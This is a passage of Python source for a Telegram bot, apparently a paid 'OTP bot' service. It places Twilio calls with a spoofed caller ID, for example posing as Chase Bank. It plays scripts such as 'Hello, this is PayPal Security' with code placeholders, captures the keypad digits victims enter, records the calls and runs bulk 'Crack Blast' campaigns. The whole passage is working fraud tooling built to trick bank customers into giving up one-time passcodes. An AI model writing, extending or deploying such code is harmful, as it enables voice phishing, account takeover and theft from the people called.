        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📡 <b>CHANNELS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Main Channel:</b> {MAIN_CHANNEL_URL}\n"
        f"<b>Backup Channel:</b> {BACKUP_CHANNEL_URL}\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_vouches_menu(chat_id: int, message_id: Optional[int] = None) -> None:
    text = (
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🤝 <b>VOUCHES</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "Trusted reviews and social proof are coming soon.\n"
        "Stay ready for the next update.\n"
    )
    buttons = types.InlineKeyboardMarkup(row_width=1)
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    if message_id:
        try:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")

def send_live_listen_panel(chat_id: int, user_id_str: str) -> None:
    sid = read_user_file(user_id_str, "call_sid.txt", "")
    if not sid:
        bot.send_message(chat_id, "❌ No active call session found. Start a call first to use Live Listen.")
        return
    try:
        call_status = twilio_client.calls(sid).fetch().status
    except Exception:
        bot.send_message(chat_id, "❌ Unable to fetch call data")
        return
    status_labels = {
        "queued": "Queued",
        "ringing": "Ringing",
        "in-progress": "In Progress",
        "completed": "Completed",
        "failed": "Failed",
        "no-answer": "No Answer",
        "busy": "Busy",
        "canceled": "Canceled",
    }
    formatted = status_labels.get(call_status, call_status.replace("-", " ").title())
    lines = [
        "🎧 <b>LIVE LISTEN PANEL</b>",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"• Status: <b>{formatted}</b>",
        "",
        "Monitoring is active while the call is in progress.",
        "If the caller answers, the call audio will be recorded and available below.",
    ]
    recording_path = user_conf_path(user_id_str) / "record.mp3"
    buttons = types.InlineKeyboardMarkup(row_width=1)
    if call_status in ["queued", "ringing", "in-progress"]:
        lines.append("\n✅ Monitoring the call now.")
    valid_recording = recording_path.exists() and recording_path.stat().st_size > 128
    if not valid_recording:
        alt_path = user_conf_path(user_id_str) / f"{sid}.mp3"
        valid_recording = alt_path.exists() and alt_path.stat().st_size > 128
    if valid_recording:
        buttons.add(types.InlineKeyboardButton("📥 Download Recording", callback_data="download_recording"))
    buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
    bot.send_message(chat_id, "\n".join(lines), reply_markup=buttons, parse_mode="HTML")

# ======================================================================
# TELEGRAM CALLBACK HANDLERS
# ======================================================================
def show_under_development_notice(chat_id: int, call_id: Optional[str] = None, feature_name: str = "This feature") -> None:
    """Show a visible under-development alert for blocked callback actions."""
    message = (
        f"🚧 <b>{feature_name}</b> is currently under development.\n\n"
        "This feature is not available yet. Please check back soon for updates."
    )
    try:
        if call_id:
            bot.answer_callback_query(call_id, f"{feature_name} is under development", show_alert=True, cache_time=1)
    except Exception as e:
        logger.debug(f"Failed to show callback popup: {e}")
    try:
        bot.send_message(chat_id, message, parse_mode="HTML")
    except Exception as e:
        logger.debug(f"Failed to send under-development message: {e}")


@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    """Main callback handler - acknowledge immediately, then process in the background executor."""
    if not getattr(call, "id", None):
        return

    user_id_str = str(call.from_user.id)
    restricted_buttons = {"schedule_menu"}
    if call.data in restricted_buttons and not is_developer_user(user_id_str):
        try:
            bot.answer_callback_query(
                call.id,
                "⚠️ Under Development — This feature is temporarily restricted to developer testing.",
                show_alert=True,
            )
        except Exception as e:
            logger.debug(f"Failed to answer restricted callback: {e}")
        return

    if call.data in {"start_call", "crack_blast", "ai_mode"} and not is_developer_user(user_id_str):
        feature_name = {
            "start_call": "Start Call",
            "crack_blast": "Crack Blast",
            "ai_mode": "AI Mode",
        }.get(call.data, "This feature")
        try:
            show_under_development_notice(call.message.chat.id, call.id, feature_name)
        except Exception as e:
            logger.debug(f"Failed to show under-development notice: {e}")
        return

    try:
        bot.answer_callback_query(call.id, "", show_alert=False, cache_time=1)
    except Exception as e:
        logger.debug(f"Failed to acknowledge callback: {e}")

    run_callback_async(_handle_query_processing, call, None)

def _handle_query_processing(call, _):
    """The actual callback processing - runs in background."""
    user_id_str = str(call.from_user.id)
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    # --- Navigation (all async to avoid blocking) ---
    if call.data == "back_to_menu":
        run_callback_async(send_main_menu, chat_id, call.from_user, message_id=message_id)
        return

    if call.data == "show_main_menu":
        run_callback_async(send_main_menu, chat_id, call.from_user)
        return

    if call.data == "account":
        run_callback_async(send_account_menu, chat_id, message_id, user_id_str)
        return

    if call.data == "open_shop":
        run_callback_async(send_shop_menu, chat_id, message_id)
        return

    if call.data == "open_loyalty":
        run_callback_async(send_loyalty_menu, chat_id, message_id, user_id_str)
        return

    if call.data == "open_scripts":
        run_callback_async(send_scripts_menu, chat_id, message_id, user_id_str)
        return

    # --- Start call submenu ---
    if call.data == "start_call" and not is_developer_user(user_id_str) and not is_developer_user(user_id_str):
        show_under_development_notice(chat_id, call.id, "Start Call")
        return

    if call.data == "normal_call":
        # Check free trial for non-premium users
        if not is_premium_user(user_id_str):
            remaining = get_free_calls(user_id_str)
            if remaining <= 0:
                alert_msg = (
                    "📞 Free Trial Exhausted\n\n"
                    f"You've completed your {FREE_TRIAL_TOTAL} complimentary Normal Calls. "
                    "Premium subscribers enjoy unlimited access to all calling modes.\n\n"
                    "Upgrade in SHOP to unlock enterprise-grade capabilities."
                )
                bot.answer_callback_query(call.id, alert_msg, show_alert=True)
                bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
                return
        def _start_normal_flow_compat():
            try:
                import handlers.call_flow as cf
                cf.init_bot(bot)
                cf.step1_name(chat_id, user_id_str)
            except Exception:
                try:
                    bot.send_message(chat_id, "❌ Failed to start Normal Call compatibility flow. Use /normal.")
                except:
                    pass
        run_callback_async(_start_normal_flow_compat)
        return

    if call.data == "fast_mode":
        if not is_full_premium_user(user_id_str):
            alert_msg = "⚡ FAST MODE requires Premium Access\n\nHigh-speed one-line call deployment is exclusive to premium members.\n\nUpgrade in SHOP to launch calls in seconds."
            bot.answer_callback_query(call.id, alert_msg, show_alert=True)
            bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
            return
        def _setup_fast_mode():
            set_user_state(user_id_str, "fast_mode_awaiting")
            text = (
                "🚀 <b>FAST MODE</b>\n\nOne-line high-speed call setup. Use this when you want a pro launch without extra prompts.\n\n"
                "Format:\n"
                "name, company, phone, caller_id, from_name, language, delivery, code_length\n\n"
                "Example:\n"
                "John Smith, Chase Bank, +1234567890, +18009359935, Support Team, en, sms, 6\n\n"
                "Send the line now or use /start to return to the main menu."
            )
            buttons = types.InlineKeyboardMarkup()
            buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
        run_callback_async(_setup_fast_mode)
        return

    if call.data == "manual_call":
        if not is_full_premium_user(user_id_str):
            alert_msg = "🔧 MANUAL CALLING requires Premium Access\n\nCustom multi-step call workflows with granular control are exclusive to premium members.\n\nUpgrade in SHOP to access professional-grade call crafting."
            bot.answer_callback_query(call.id, alert_msg, show_alert=True)
            bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
            return
        def _setup_manual_call():
            ensure_user_path(user_id_str)
            set_user_state(user_id_str, "manual_call_step_1_phone")
            text = (
                "🔧 <b>MANUAL CALLING</b>\n\nStep 1/8: Target Phone Number\nEnter the target phone number with country code (e.g. +1234567890)."
            )
            buttons = types.InlineKeyboardMarkup(row_width=1)
            buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
        run_callback_async(_setup_manual_call)
        return

    if call.data == "manual_script_library":
        run_callback_async(send_script_list, chat_id, user_id_str, "manual")
        return

    if call.data == "custom_script_library":
        run_callback_async(send_script_list, chat_id, user_id_str, "custom")
        return

    # --- Create new script ---
    if call.data == "create_script":
        def _start_create_script():
            set_user_state(user_id_str, "create_script_name")
            text = (
                "📝 <b>CREATE NEW SCRIPT</b>\n\n"
                "Step 1/2: Script Name\n\n"
                "Enter a name for your script (max 50 characters).\n"
                "Example: My PayPal Alert, Chase Verification, Amazon OTP\n\n"
                "Be descriptive so you remember what this script does!"
            )
            buttons = types.InlineKeyboardMarkup()
            buttons.add(types.InlineKeyboardButton("❌ Cancel", callback_data="open_scripts"))
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
        run_callback_async(_start_create_script)
        return

    # --- Paste custom script (from library menu) ---
    if call.data == "paste_script_to_library":
        def _start_paste_script():
            set_user_state(user_id_str, "paste_script_library_content")
            text = (
                "📋 <b>PASTE CUSTOM SCRIPT</b>\n\n"
                "Send your script content now.\n\n"
                "<b>Format:</b>\n"
                "Line 1: Script Name (max 50 chars)\n"
                "Line 2: Leave blank\n"
                "Lines 3+: Script content (max 1800 chars)\n\n"
                "<b>Example:</b>\n"
                "My PayPal Script\n"
                "\n"
                "[GREETING]\n"
                "Hello, this is PayPal Security...\n\n"
                "💡 Use placeholders: {name}, {code}, {company}"
            )
            buttons = types.InlineKeyboardMarkup()
            buttons.add(types.InlineKeyboardButton("❌ Cancel", callback_data="open_scripts"))
            bot.send_message(chat_id, text, reply_markup=buttons, parse_mode="HTML")
        run_callback_async(_start_paste_script)
        return

    if call.data == "script_paste":
        def _handle_script_paste():
            state = get_user_state(user_id_str)
            if state == "manual_call_step_3_script_choice":
                set_user_state(user_id_str, "manual_call_step_3_script_input")
                bot.send_message(chat_id, "✍️ Paste your custom manual call script now. You can include placeholders like {name} or {code}.")
            elif state == "custom_call_step_1_script_choice":
                set_user_state(user_id_str, "custom_call_step_2_script_input")
                bot.send_message(chat_id, "✍️ Paste your custom voice message now. Use placeholders like {name}, {company}, or {code}. For A/B tests, separate variants with ||.")
            elif state == "crack_blast_step_2_script_choice":
                set_user_state(user_id_str, "crack_blast_step_2_script_input")
                bot.send_message(chat_id, "✍️ Paste your custom Crack Blast campaign script now. Use placeholders like {name} or {code}.")
            else:
                bot.send_message(chat_id, "❌ No script flow in progress. Please start again from the call builder.")
        run_callback_async(_handle_script_paste)
        return

    if call.data.startswith("script_select_"):
        def _handle_script_select():
            try:
                parts = call.data.split("_")
                if len(parts) < 4:
                    raise ValueError("Invalid script selection")
                scope = parts[2]
                script_id = parts[3]
                rows = db_get_script_rows(user_id_str)
                selected = next((row for row in rows if str(row["user_id"]) == scope and str(row["id"]) == script_id), None)
                if not selected:
                    selected = next((row for row in rows if str(row["id"]) == script_id), None)
                script_text = selected["content"] if selected else ""
                state = get_user_state(user_id_str)
                if state == "manual_call_step_3_script_choice":
                    write_user_file(user_id_str, "manual_script.txt", script_text)
                    next_state = "manual_call_step_4_voice"
                    prompt = "🎤 Step 4/8: Voice Selection\nChoose your voice from the list below."
                elif state == "custom_call_step_1_script_choice":
                    write_user_file(user_id_str, "custom_script.txt", script_text)
                    next_state = "custom_call_step_3_phone"
                    prompt = "📞 Step 2/8: Target Phone Number\nEnter the target phone number with country code (e.g. +1234567890)."
                elif state == "crack_blast_step_2_script_choice":
                    write_user_file(user_id_str, "crack_script.txt", script_text)
                    next_state = "crack_blast_step_3_callerid"
                    prompt = "💠 Step 3/7: Caller ID\nEnter the caller ID number to display, or send /skip to use the default Twilio number."
                else:
                    bot.send_message(chat_id, "❌ No active script flow found.")
                    return

                set_user_state(user_id_str, next_state)
                bot.send_message(chat_id, prompt)
                if next_state == "manual_call_step_4_voice" or next_state == "crack_blast_step_4_voice":
                    try:
                        from menu_utils import build_voice_selection_keyboard
                        keyboard = build_voice_selection_keyboard(VOICE_MAPPING, "", "voice_select_")
                        bot.send_message(chat_id, "Select a voice:", reply_markup=keyboard)
                    except Exception:
                        bot.send_message(chat_id, "Send the voice number or name now.")
            except Exception:
                bot.send_message(chat_id, "❌ Could not select that script. Try again.")
        run_callback_async(_handle_script_select)
        return

    if call.data.startswith("script_preview_"):
        def _handle_script_preview():
            try:
                parts = call.data.split("_")
                if len(parts) < 4:
                    raise ValueError("Invalid preview")
                scope = parts[2]
                script_id = parts[3]
                rows = db_get_script_rows(user_id_str)
                selected = next((row for row in rows if str(row["user_id"]) == scope and str(row["id"]) == script_id), None)
                if not selected:
                    selected = next((row for row in rows if str(row["id"]) == script_id), None)
                if not selected:
                    raise ValueError("Script not found")
                preview_text = f"📄 <b>{html.escape(selected['name'])}</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{html.escape(selected['content'])}"
                buttons = types.InlineKeyboardMarkup(row_width=1)
                buttons.add(types.InlineKeyboardButton("✅ Use This Script", callback_data=f"script_select_{selected['user_id']}_{selected['id']}"))
                buttons.add(types.InlineKeyboardButton("💾 Save to My Library", callback_data=f"script_save_{selected['user_id']}_{selected['id']}"))
                buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="open_scripts"))
                bot.send_message(chat_id, preview_text, reply_markup=buttons, parse_mode="HTML")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Preview failed: {e}")
        run_callback_async(_handle_script_preview)
        return

    if call.data.startswith("script_save_"):
        def _handle_script_save():
            try:
                parts = call.data.split("_")
                if len(parts) < 4:
                    raise ValueError("Invalid save")
                scope = parts[2]
                script_id = parts[3]
                rows = db_get_script_rows(user_id_str)
                selected = next((row for row in rows if str(row["user_id"]) == scope and str(row["id"]) == script_id), None)
                if not selected:
                    selected = next((row for row in rows if str(row["id"]) == script_id), None)
                if not selected:
                    raise ValueError("Script not found")
                if selected["user_id"] == user_id_str:
                    bot.send_message(chat_id, "ℹ️ This script is already in your library.")
                    return
                if db_add_script(user_id_str, selected["name"], selected["content"]):
                    bot.send_message(chat_id, f"✅ Saved to your library: <b>{html.escape(selected['name'])}</b>", parse_mode="HTML")
                else:
                    bot.send_message(chat_id, "❌ Could not save the script to your library.")
            except Exception as e:
                bot.send_message(chat_id, f"❌ Save failed: {e}")
        run_callback_async(_handle_script_save)
        return

    if call.data == "manual_call_preview_audio":
        script = read_user_file(user_id_str, "manual_script.txt", "").strip()
        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
        if not script:
            bot.send_message(chat_id, "❌ No manual script found. Set the script first.")
            return
        bot.send_message(chat_id, "⏳ Generating preview audio...")
        def _gen_and_send_manual():
            try:
                audio_path = user_conf_path(user_id_str) / "manual_preview.mp3"
                generate_call_audio(user_id=user_id_str, text=script, voice_id=voice_id, filename="manual_preview.mp3")
                if audio_path.exists():
                    try:
                        with open(audio_path, "rb") as f:
                            bot.send_audio(chat_id, f)
                    except Exception as e:
                        bot.send_message(chat_id, f"❌ Preview failed: {e}")
                else:
                    bot.send_message(chat_id, "❌ Preview generation failed.")
            except Exception as e:
                logger.exception("Manual preview generation error")
                try:
                    bot.send_message(chat_id, f"❌ Preview generation error: {e}")
                except:
                    pass
        threading.Thread(target=_gen_and_send_manual, daemon=True).start()
        return

    if call.data == "manual_call_confirm":
        phonenum = normalize_phone_number(read_user_file(user_id_str, "manual_phonenum.txt", ""))
        script = read_user_file(user_id_str, "manual_script.txt", "").strip()
        if not phonenum or not is_valid_e164(phonenum):
            bot.send_message(chat_id, "❌ Invalid or missing target phone number. Please restart manual calling.")
            return
        if not script:
            bot.send_message(chat_id, "❌ Missing manual script. Please set it before starting the call.")
            return
        caller_id = read_user_file(user_id_str, "manual_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
        digits = read_user_file(user_id_str, "manual_digits.txt", "0").strip()
        delay = read_user_file(user_id_str, "manual_delay.txt", "0").strip() or "0"
        fallback = read_user_file(user_id_str, "manual_fallback.txt", "").strip()

        bot.send_message(chat_id, "✨ Starting manual call now. Live listen and DTMF capture will be active.")

        def _start_manual_call():
            try:
                from config import USE_AI_FLOW, DEFAULT_VOICE_ID as CONFIG_DEFAULT_VOICE_ID
                
                name = read_user_file(user_id_str, "Name.txt", "Customer")
                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                
                if USE_AI_FLOW:
                    webhook_url = (
                        f"{NGROK_URL.rstrip('/')}/ai_start"
                        f"?user_id={quote_plus(str(user_id_str))}"
                        f"&chat_id={quote_plus(str(chat_id))}"
                        f"&name={quote_plus(name)}"
                        f"&company={quote_plus(company)}"
                        f"&voice_id={quote_plus(voice_id)}"
                        f"&custom_script={quote_plus(script)}"
                        f"&code_length={quote_plus(code_length)}"
                        f"&call_type=manual"
                        f"&mode_label=Manual%20Call"
                    )
                else:
                    webhook_url = f"{NGROK_URL.rstrip('/')}/manual_flow?user_id={quote_plus(str(user_id_str))}&chat_id={quote_plus(str(chat_id))}"
                
                sid = make_spoofed_call(
                    to=phonenum,
                    from_number=TWILIO_PHONE_NUMBER,
                    caller_id=caller_id,
                    webhook_url=webhook_url,
                    user_id=user_id_str,
                    chat_id=chat_id,
                    call_record=True,
                )
                if not sid:
                    raise Exception("Failed to create manual call")
                store_call_metadata(user_id_str, sid)
                live_buttons = types.InlineKeyboardMarkup(row_width=1)
                live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                bot.send_message(chat_id, "🎯 Manual call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
                try:
                    _http.post(
                        f"{LIVE_LISTEN_URL}/conversation/start",
                        json={"call_sid": sid, "chat_id": chat_id},
                        timeout=REQ_TIMEOUT,
                    )
                except Exception:
                    pass
                user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
                report_twilio_call_status(chat_id, sid, user=user_obj)
            except Exception as e:
                bot.send_message(chat_id, f"❌ Failed to initiate manual call: {e}")

        run_callback_async(_start_manual_call)
        return

    if call.data == "manual_call_schedule":
        set_user_state(user_id_str, "manual_call_schedule")
        bot.send_message(chat_id, "📅 Enter schedule details in the format: +1234567890,DD/MM/YYYY,HH:MM\nExample: +1234567890,25/06/2026,14:30")
        return

    if call.data == "custom_call":
        if not is_full_premium_user(user_id_str):
            alert_msg = "⭐ CUSTOM CALL requires Premium Access\n\nBuild and deploy personalized multi-step voice sequences with unlimited customization—exclusive to premium members.\n\nUpgrade in SHOP to create advanced campaigns."
            bot.answer_callback_query(call.id, alert_msg, show_alert=True)
            bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
            return

        def _setup_custom_call():
            try:
                bot.answer_callback_query(call.id, "Opening Custom Call...", show_alert=False)
                ensure_user_path(user_id_str)
                set_user_state(user_id_str, "custom_call_step_1_script_choice")
                buttons = types.InlineKeyboardMarkup(row_width=1)
                buttons.add(types.InlineKeyboardButton("✍️ Paste custom message", callback_data="script_paste"))
                buttons.add(types.InlineKeyboardButton("📚 Choose saved message", callback_data="custom_script_library"))
                buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
                bot.send_message(
                    chat_id,
                    "⭐ <b>CUSTOM CALL BUILDER</b>\n\nStep 1/8: Message Content\nChoose a saved script or paste a custom voice message now. Use {name}, {company}, {code} placeholders. Separate variants with || for A/B testing.",
                    reply_markup=buttons,
                    parse_mode="HTML",
                )
            except Exception as e:
                try:
                    bot.send_message(chat_id, f"❌ Failed to open Custom Call menu: {e}")
                except:
                    pass

        _setup_custom_call()
        return

    if call.data == "custom_call_preview_audio":
        script = read_user_file(user_id_str, "custom_script.txt", "").strip()
        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
        if not script:
            bot.send_message(chat_id, "❌ No custom script found. Set the script first.")
            return
        bot.send_message(chat_id, "⏳ Generating preview audio...")
        def _gen_and_send_custom():
            try:
                audio_path = user_conf_path(user_id_str) / "custom_preview.mp3"
                generate_call_audio(user_id=user_id_str, text=script, voice_id=voice_id, filename="custom_preview.mp3")
                if audio_path.exists():
                    try:
                        with open(audio_path, "rb") as f:
                            bot.send_audio(chat_id, f)
                    except Exception as e:
                        bot.send_message(chat_id, f"❌ Preview failed: {e}")
                else:
                    bot.send_message(chat_id, "❌ Preview generation failed.")
            except Exception as e:
                logger.exception("Custom preview generation error")
                try:
                    bot.send_message(chat_id, f"❌ Preview generation error: {e}")
                except:
                    pass
        threading.Thread(target=_gen_and_send_custom, daemon=True).start()
        return

    if call.data == "custom_call_confirm":
        phonenum = normalize_phone_number(read_user_file(user_id_str, "custom_phonenum.txt", ""))
        script = read_user_file(user_id_str, "custom_script.txt", "").strip()
        if not phonenum or not is_valid_e164(phonenum):
            bot.send_message(chat_id, "❌ Invalid or missing target phone number. Please restart custom call setup.")
            return
        if not script:
            bot.send_message(chat_id, "❌ Missing custom script. Please set it before starting the call.")
            return
        caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
        digits = read_user_file(user_id_str, "custom_digits.txt", "0").strip()
        delay = read_user_file(user_id_str, "custom_delay.txt", "0").strip() or "0"
        fallback = read_user_file(user_id_str, "custom_fallback.txt", "").strip()

        bot.send_message(chat_id, "✨ Starting custom call now. Live listen and DTMF capture will be active.")

        def _start_custom_call():
            try:
                from config import USE_AI_FLOW, DEFAULT_VOICE_ID as CONFIG_DEFAULT_VOICE_ID
                
                name = read_user_file(user_id_str, "Name.txt", "Customer")
                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                
                webhook_url = (
                    f"{NGROK_URL.rstrip('/')}/ai_start"
                    f"?user_id={quote_plus(str(user_id_str))}"
                    f"&chat_id={quote_plus(str(chat_id))}"
                    f"&name={quote_plus(name)}"
                    f"&company={quote_plus(company)}"
                    f"&voice_id={quote_plus(voice_id)}"
                    f"&custom_script={quote_plus(script)}"
                    f"&code_length={quote_plus(code_length)}"
                    f"&call_type=custom"
                    f"&mode_label=Custom%20Call"
                )
                
                sid = make_spoofed_call(
                    to=phonenum,
                    from_number=TWILIO_PHONE_NUMBER,
                    caller_id=caller_id,
                    webhook_url=webhook_url,
                    user_id=user_id_str,
                    chat_id=chat_id,
                    call_record=True,
                )
                if not sid:
                    raise Exception("Failed to create custom call")
                store_call_metadata(user_id_str, sid)
                live_buttons = types.InlineKeyboardMarkup(row_width=1)
                live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                bot.send_message(chat_id, "🎯 Custom call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
                try:
                    _http.post(
                        f"{LIVE_LISTEN_URL}/conversation/start",
                        json={"call_sid": sid, "chat_id": chat_id},
                        timeout=REQ_TIMEOUT,
                    )
                except Exception:
                    pass
                user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
                report_twilio_call_status(chat_id, sid, user=user_obj)
            except Exception as e:
                bot.send_message(chat_id, f"❌ Failed to initiate custom call: {e}")

        run_callback_async(_start_custom_call)
        return

    if call.data == "custom_call_schedule":
        set_user_state(user_id_str, "custom_call_schedule")
        bot.send_message(chat_id, "📅 Enter schedule details in the format: +1234567890,DD/MM/YYYY,HH:MM\nExample: +1234567890,25/06/2026,14:30")
        return

    if call.data == "emotion_call":
        if not is_full_premium_user(user_id_str):
            alert_msg = "🎭 AI EMOTION CALL requires Premium Access\n\nAdvanced AI-driven emotion-based voice modulation is exclusive to premium subscribers.\n\nUpgrade in SHOP to unlock intelligent voice personas."
            bot.answer_callback_query(call.id, alert_msg, show_alert=True)
            bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
            return
        text = (
            "🧠 <b>AI EMOTION CALL</b>\n\n"
            "Choose emotion for the AI voice:\n"
            "1️⃣ Neutral\n"
            "2️⃣ Cheerful\n"
            "3️⃣ Angry\n"
            "4️⃣ Fearful\n"
            "5️⃣ Surprise\n"
            "Reply with the emotion name or number."
        )
        bot.send_message(chat_id, text, parse_mode="HTML")
        return

    if call.data == "crack_blast" and not is_developer_user(user_id_str) and not is_developer_user(user_id_str):
        show_under_development_notice(chat_id, call.id, "Crack Blast")
        return

    if call.data == "crack_blast_script_paste":
        set_user_state(user_id_str, "crack_blast_step_2_script_input")
        bot.send_message(chat_id, "✍️ Paste your custom Crack Blast message now. Use placeholders like {name} or {code} if needed.")
        return

    if call.data == "crack_blast_script_library":
        set_user_state(user_id_str, "crack_blast_step_2_script_choice")
        send_crack_script_list(chat_id, user_id_str)
        return

    if call.data == "crack_blast_cancel":
        clear_user_state(user_id_str)
        send_main_menu(chat_id, call.from_user, message_id=message_id)
        return

    if call.data == "crack_blast_start":
        clear_user_state(user_id_str)
        run_callback_async(launch_crackblast_campaign, user_id_str, chat_id)
        return

    if call.data == "crackblast_export_csv":
        history = get_call_history(user_id_str)
        campaign_entries = [entry for entry in history if entry.get("campaign") == "CRACK BLAST"]
        if not campaign_entries:
            bot.send_message(chat_id, "ℹ️ No Crack Blast campaign history found to export.")
            return
        export_path = user_conf_path(user_id_str) / "crackblast_report.csv"
        try:
            with open(export_path, "w", newline="", encoding="utf-8") as f:
                writer = csv.DictWriter(f, fieldnames=["sid", "target", "campaign", "status", "started"])
                writer.writeheader()
                for row in campaign_entries:
                    writer.writerow({
                        "sid": row.get("sid", ""),
                        "target": row.get("target", ""),
                        "campaign": row.get("campaign", ""),
                        "status": row.get("status", ""),
                        "started": row.get("started", ""),
                    })
            with open(export_path, "rb") as f:
                bot.send_document(chat_id, f)
        except Exception as e:
            bot.send_message(chat_id, f"❌ Could not export CSV: {e}")
        return

    if call.data == "cancel_call":
        clear_user_state(user_id_str)
        send_main_menu(chat_id, call.from_user, message_id=message_id)
        return

    # --- Normal Call: Schedule ---
    if call.data == "normal_schedule":
        clear_user_state(user_id_str)
        bot.send_message(chat_id, "❌ Normal Call scheduling moved to the new flow. Use /normal to start the professional Normal Call setup.")
        return

    # --- Normal Call: Edit All (restart) ---
    if call.data == "normal_edit":
        clear_user_state(user_id_str)
        import handlers.call_flow as cf
        cf.init_bot(bot)
        cf.step1_name(chat_id, user_id_str)
        return

    # --- Normal Call: Preview Voice ---
    if call.data == "normal_preview_voice":
        import handlers.call_flow as cf
        cf.init_bot(bot)
        cf.generate_voice_preview(chat_id, user_id_str)
        return

    # --- Normal Call: Confirm & Initiate (Professional Flow) ---
    if call.data == "normal_confirm":
        status_message_id = None
        try:
            bot.answer_callback_query(call.id, "Starting Normal Call...", show_alert=False)
            status_message = bot.send_message(chat_id, "⏳ Starting Normal Call...")
            status_message_id = getattr(status_message, 'message_id', None)
        except Exception:
            pass
        call_mode_label = read_user_file(user_id_str, "call_mode_label.txt", "").strip() or "Normal Call"
        if call_mode_label:
            try:
                (user_conf_path(user_id_str) / "call_mode_label.txt").unlink()
            except Exception:
                pass
        run_callback_async(initiate_normal_call, chat_id, user_id_str, call.from_user, status_message_id, mode_label=call_mode_label)
        return

    # --- Initiate custom call ---
    if call.data == "initiate_custom_call":
        user_id_str = str(call.from_user.id)
        if not is_premium_user(user_id_str):
            alert_msg = "⭐ CUSTOM CALL requires Premium Access\n\nBuild and deploy personalized multi-step voice sequences with unlimited customization—exclusive to premium members.\n\nUpgrade in SHOP to create advanced campaigns."
            bot.answer_callback_query(call.id, alert_msg, show_alert=True)
            bot.send_message(chat_id, f"❌ {alert_msg}", parse_mode="HTML")
            return
        phonenum = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
        script = read_user_file(user_id_str, "custom_script.txt", "")
        if not script or not phonenum:
            bot.send_message(chat_id, "❌ Missing custom message or phone number.")
            return
        if not is_valid_e164(phonenum):
            bot.send_message(chat_id, "❌ Invalid target phone number. Please use +1234567890 format.")
            return
        write_user_file(user_id_str, "phonenum.txt", phonenum)
        # ✅ Audio generated on-demand when call connects
        bot.send_message(chat_id, "✨ INITIATE CUSTOM CALL\n\nStarting your custom voice call now. Live listen will be available shortly.")

        def _start_custom_call():
            try:
                name = read_user_file(user_id_str, "Name.txt", "Customer")
                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                webhook_url = (
                    f"{NGROK_URL.rstrip('/')}/ai_start"
                    f"?user_id={quote_plus(str(user_id_str))}"
                    f"&chat_id={quote_plus(str(chat_id))}"
                    f"&name={quote_plus(name)}"
                    f"&company={quote_plus(company)}"
                    f"&voice_id={quote_plus(voice_id)}"
                    f"&custom_script={quote_plus(script)}"
                    f"&code_length={quote_plus(code_length)}"
                    f"&call_type=custom"
                    f"&mode_label=Custom%20Call"
                )
                caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
                sid = make_spoofed_call(
                    to=phonenum,
                    from_number=TWILIO_PHONE_NUMBER,
                    caller_id=caller_id,
                    webhook_url=webhook_url,
                    user_id=user_id_str,
                    chat_id=chat_id,
                    call_record=True,
